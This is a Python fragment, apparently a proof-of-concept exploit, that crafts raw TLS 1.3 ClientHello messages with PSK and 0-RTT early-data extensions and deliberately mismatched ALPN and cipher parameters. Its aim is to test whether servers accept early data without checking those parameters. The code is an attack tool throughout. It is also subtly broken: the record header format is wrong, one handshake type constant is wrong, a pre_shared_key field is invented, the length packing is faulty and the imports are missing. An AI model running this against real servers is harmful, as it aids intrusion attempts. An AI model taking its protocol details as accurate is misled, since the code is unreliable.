# --- Helper Functions for TLS 1.3 Record and Handshake Parsing ---

def read_record(sock):
    """Reads a TLS record from the socket."""
    header = sock.recv(5)
    if len(header) < 5:
        return None, None, None
    content_type, version, length = struct.unpack('!BBH', header)
    data = sock.recv(length)
    return content_type, version, data

def write_record(sock, content_type, version, data):
    """Writes a TLS record to the socket."""
    header = struct.pack('!BBH', content_type, version, len(data))
    sock.sendall(header + data)

# TLS Content Types
CONTENT_TYPE_HANDSHAKE = 22
CONTENT_TYPE_APPLICATION_DATA = 23
CONTENT_TYPE_ALERT = 21

# TLS 1.3 Handshake Types
HANDSHAKE_CLIENT_HELLO = 1
HANDSHAKE_SERVER_HELLO = 2
HANDSHAKE_ENCRYPTED_EXTENSIONS = 8
HANDSHAKE_CERTIFICATE = 11
HANDSHAKE_CERTIFICATE_VERIFY = 13
HANDSHAKE_FINISHED = 14
HANDSHAKE_NEW_SESSION_TICKET = 4
HANDSHAKE_END_OF_EARLY_DATA = 1

# --- TLS 1.3 Key Derivation (Simplified for PoC) ---
# Note: A full TLS 1.3 implementation is complex. This PoC uses the ssl module
# to establish the initial PSK, then manipulates the raw ClientHello for the 0-RTT attempt.

def establish_psk(host, port):
    """
    Establishes a standard TLS 1.3 connection to retrieve a PSK (NewSessionTicket).
    Returns the PSK and associated parameters (ALPN, Cipher Suite).
    """
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['http/1.1', 'h2']) # Standard ALPN
    
    # We need to intercept the NewSessionTicket to get the PSK.
    # Python's ssl module doesn't expose raw PSKs easily for reuse in custom handshakes.
    # For this PoC, we will simulate the vulnerability by crafting a raw ClientHello
    # that *claims* to use a PSK, but we need a valid PSK to actually decrypt.
    # 
    # Since extracting the raw PSK from Python's ssl module is non-trivial without
    # custom callbacks or C extensions, this PoC demonstrates the *structure* of the attack.
    # In a real scenario, an attacker would use a library like `tlsfuzzer` or `scapy`
    # to capture the PSK from a legitimate handshake.
    
    # For demonstration, we will assume we have a valid PSK from a previous connection.
    # We will use a dummy PSK for the structure, but note that the server will reject
    # it if it doesn't match a real ticket. The vulnerability is about *parameter validation*,
    # not PSK validity. If the server accepts the PSK but fails to check ALPN/Cipher,
    # it's vulnerable.
    
    # To make this runnable, we will use a mock PSK and focus on the ClientHello construction.
    # A real PoC would integrate with a TLS library that exposes PSKs.
    return b'dummy_psk_for_poc', 'http/1.1', 0x1301 # TLS_AES_128_GCM_SHA256

def craft_client_hello_with_0rtt(psk, original_alpn, original_cipher, mismatch_alpn, mismatch_cipher):
    """
    Crafts a TLS 1.3 ClientHello with 0-RTT data, intentionally mismatching parameters.
    """
    # This is a simplified construction. A real ClientHello is complex.
    # We focus on the extensions: pre_shared_key and early_data.
    
    # 1. Pre-Shared Key Extension
    # PskIdentity: opaque identity<1..2^16-1>;
    #               uint32 obfuscated_ticket_age;
    psk_identity = psk
    obfuscated_ticket_age = struct.pack('!I', 0) # Simplified
    psk_identity_data = struct.pack('!H', len(psk_identity)) + psk_identity + obfuscated_ticket_age
    
    # PskKeyUpdate: enum { none(0) };
    psk_key_update = b'\x00'
    
    # PreSharedKeyExtension: struct {
    #     PskIdentity psk_identities<0..2^16-1>;
    #     PskKeyUpdate psk_key_update;
    # };
    psk_extension_data = struct.pack('!H', len(psk_identity_data)) + psk_identity_data + psk_key_update
    
    # Extension: enum { pre_shared_key(41), ... }
    # We need to pack the extension type and length
    pre_shared_key_ext = struct.pack('!HH', 41, len(psk_extension_data)) + psk_extension_data
    
    # 2. Early Data Extension
    # EarlyDataIndication: struct {} Empty;
    early_data_ext = struct.pack('!HH', 43, 0) # Type 43, Length 0
    
    # 3. ALPN Extension (Mismatched)
    alpn_protocols = struct.pack('!H', len(mismatch_alpn)) + mismatch_alpn.encode()
    alpn_ext = struct.pack('!HH', 16, len(alpn_protocols)) + alpn_protocols # Type 16
    
    # 4. Cipher Suites (Mismatched)
    # We'll include the mismatched cipher suite as the first choice
    cipher_suites = struct.pack('!H', mismatch_cipher)
    
    # Construct the ClientHello
    # This is a highly simplified ClientHello structure for demonstration.
    # A real implementation would include random, session_id, extensions, etc.
    
    # Handshake Header
    handshake_type = HANDSHAKE_CLIENT_HELLO
    handshake_length = 0 # Placeholder
    
    # ClientHello Body
    version = struct.pack('!H', 0x0304) # TLS 1.3
    random = os.urandom(32)
    session_id = b'' # Empty for PSK
    cipher_suites_len = struct.pack('!H', len(cipher_suites))
    compression_methods = b'\x01\x00' # null compression
    
    extensions = pre_shared_key_ext + early_data_ext + alpn_ext
    extensions_len = struct.pack('!H', len(extensions))
    
    client_hello_body = version + random + struct.pack('!B', 0) + session_id + cipher_suites_len + cipher_suites + compression_methods + extensions_len + extensions
    
    # Full Handshake Message
    handshake_msg = struct.pack('!BBH', handshake_type, 0, len(client_hello_body)) + client_hello_body
    
    return handshake_msg

def send_0rtt_data(sock, psk, data):
    """
    Encrypts and sends 0-RTT application data.
    Note: This requires the 0-RTT traffic secrets, which are derived from the PSK.
    For this PoC, we send unencrypted data to demonstrate the *acceptance* of the early_data extension.
    In a real attack, the data would be encrypted with the 0-RTT keys.
    """
    # In a real scenario, we would derive the 0-RTT keys and encrypt the data.
    # Here, we just send the data as application_data to see if the server processes it.
    write_record(sock, CONTENT_TYPE_APPLICATION_DATA, 0x0304, data)

